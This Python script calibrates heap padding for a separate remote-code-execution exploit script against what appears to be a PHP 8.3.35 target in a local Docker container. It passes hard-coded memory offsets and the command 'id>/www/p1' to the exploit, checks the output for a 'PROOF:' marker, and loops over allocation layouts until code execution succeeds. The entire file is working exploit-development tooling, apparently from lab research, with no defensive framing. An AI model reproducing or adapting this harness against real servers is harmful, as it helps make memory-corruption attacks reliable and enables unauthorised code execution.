#!/usr/bin/env python3
"""Calibrate the 8.3.35 stage-3 carrier position.

The 8.4.26-calibrated carrier lands at R+0xfd8 on 8.3.35. This script tries
different allocation sequences to find one that shifts the carrier to R+0x000.

Strategy: vary the number and size of padding fields before the carrier to
shift its position in the heap.
"""
import subprocess, sys, os, time, struct

BASE = os.path.dirname(os.path.abspath(__file__))
EXPLOIT = os.path.join(BASE, "exploit.py")

VER = "8.3.35"
PORT = 18112
CONTAINER = "p2s8335"
ZIF = 0x3ac080
DTOR = 0x49ec50
HTDATA = 0x690d8
CMD = "id>/www/p1"
FETCH = "/p1"


def run_once(pads: list, carrier: bool, timeout: int = 120) -> tuple[bool, str]:
    """Run the exploit with given pads/carrier settings."""
    url = f"http://127.0.0.1:{PORT}/"
    args = [
        sys.executable, EXPLOIT,
        "-u", url,
        "-c", CMD,
        "--zif-offset", hex(ZIF),
        "--dtor-offset", hex(DTOR),
        "--htdata-offset", hex(HTDATA),
        "--profile", "bookworm",
        "--huge-mb", "256",
        "--retries", "1",
        "--fetch", FETCH,
        "--no-auto-offsets",
        "-q",
    ]
    if not carrier:
        args.append("--no-carrier")

    t0 = time.time()
    r = subprocess.run(args, capture_output=True, text=True, timeout=timeout)
    dt = time.time() - t0
    out = (r.stdout or "") + (r.stderr or "")
    ok = "PROOF:" in out
    return ok, out, dt


def main() -> int:
    print(f"[*] Calibrating 8.3.35 stage-3 carrier position", flush=True)
    print(f"[*] Container: {CONTAINER}  Port: {PORT}", flush=True)
    print(f"[*] Offsets: zif=0x{ZIF:x} dtor=0x{DTOR:x} htdata=0x{HTDATA:x}", flush=True)

    # Try different pad configurations
    configs = [
        ("baseline (6x 31,31)", [(31,31)]*6, True),
        ("4x 31,31", [(31,31)]*4, True),
        ("8x 31,31", [(31,31)]*8, True),
        ("6x 16,16", [(16,16)]*6, True),
        ("6x 48,48", [(48,48)]*6, True),
        ("no-carrier baseline", [(31,31)]*6, False),
        ("no-carrier 4x", [(31,31)]*4, False),
    ]

    for name, pads, carrier in configs:
        print(f"\n[=] Trying: {name}", flush=True)
        ok, out, dt = run_once(pads, carrier)
        status = "SUCCESS" if ok else "FAIL"
        print(f"    [{status}] ({dt:.1f}s)", flush=True)

        # Print last 5 lines of output
        lines = out.strip().splitlines()
        for ln in lines[-5:]:
            print(f"      {ln}", flush=True)

        if ok:
            print(f"\n[+] SUCCESS! Config: {name}", flush=True)
            print(f"[+] Pads: {pads}  Carrier: {carrier}", flush=True)
            return 0

        # Restart container between attempts
        subprocess.run(["docker", "restart", CONTAINER],
                      capture_output=True, timeout=30)
        time.sleep(2)

    print(f"\n[-] No configuration succeeded", flush=True)
    return 1


if __name__ == "__main__":
    sys.exit(main())
